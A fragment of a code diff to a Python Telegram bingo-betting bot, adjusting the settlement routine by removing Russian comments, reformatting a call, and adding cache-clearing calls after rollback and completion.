             game['losses_applied'] = list(losses_applied)
             gamesbingo.save()
 
-        # --- ШАГ B: единичное начисление победителю ---
         if not game.get('winner_applied', False):
             gfund_result = None
             if gain > 0:
@@ -1103,8 +1115,7 @@ async def _settle_saga(game_id: int):
                 await _rollback_debits(list(losses_applied), bet)
                 try:
                     await safe_edit_text_and_markup(
-                        game,
-                        chat_id=game["chat_id"], message_id=game["message_id"],
+                        game, chat_id=game["chat_id"], message_id=game["message_id"],
                         text="⛑ <b>Игра остановлена!</b>\nТехническая ошибка взаиморасчётов.",
                         reply_markup=None, parse_mode="HTML", disable_web_page_preview=True
                     )
@@ -1115,12 +1126,12 @@ async def _settle_saga(game_id: int):
                 game['settling'] = False
                 gamesbingo.save()
                 gamesbingo.pop(game_id, None)
+                _clear_boost_cache(game_id)
                 return
 
             game['winner_applied'] = True
             gamesbingo.save()
 
-            # Обновляем итоговое сообщение реальной (после комиссии) суммой выигрыша.
             try:
                 win_num = game.get('win_num')
                 winner_link = await create_user_link(
@@ -1146,7 +1157,6 @@ async def _settle_saga(game_id: int):
             except Exception as e:
                 print(f"[BINGO][result edit after commission] {e}")
 
-        # История «last_open_time»
         try:
             last_open_time, data_open = await db.get_historygames_times(winner_id)
             current_time = time.time()
@@ -1172,7 +1182,6 @@ async def _settle_saga(game_id: int):
         except Exception as e:
             print(f"[BINGO][history] {e}")
 
-        # Завершение
         game['state'] = STATE_SETTLED
         game['settling'] = False
         gamesbingo.save()
@@ -1181,6 +1190,7 @@ async def _settle_saga(game_id: int):
             del gamesbingo[game_id]
         except KeyError:
             pass
+        _clear_boost_cache(game_id)
 
 # ====== ПОПАП "ПОДРОБНЕЕ" ======
 @dp.callback_query(lambda c: c.data.startswith('podrobneebingohui_'))
